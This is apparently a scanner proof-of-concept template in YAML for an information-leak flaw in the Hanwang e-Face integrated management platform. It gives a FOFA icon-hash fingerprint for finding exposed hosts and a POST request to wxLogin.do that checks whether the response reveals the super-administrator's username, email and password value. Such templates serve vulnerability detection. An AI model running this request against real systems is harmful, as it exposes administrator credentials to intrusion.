id: poc-yaml-hw-e-face-pass-spmp-wxlogin-do-info-leak
info:
  name: 汉王e脸通综合管理平台 wxLogin.do 信息泄露漏洞
  severity: high
  tags:
  - 信息泄露
  finger: e脸通智慧园区管理平台
  fofa: icon_hash="1380907357"
requests:
- method: POST
  path: /manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1
  expression: status_code == 200 && contains(body,"\"userName\":\"admin\"") && contains(body,"超级管理员")
    && contains(body,"\"email\":") && !contains(body,"<") && matches(body,"\"password\":\"([0-9a-z]+)\"")
variables: {}
transport: http
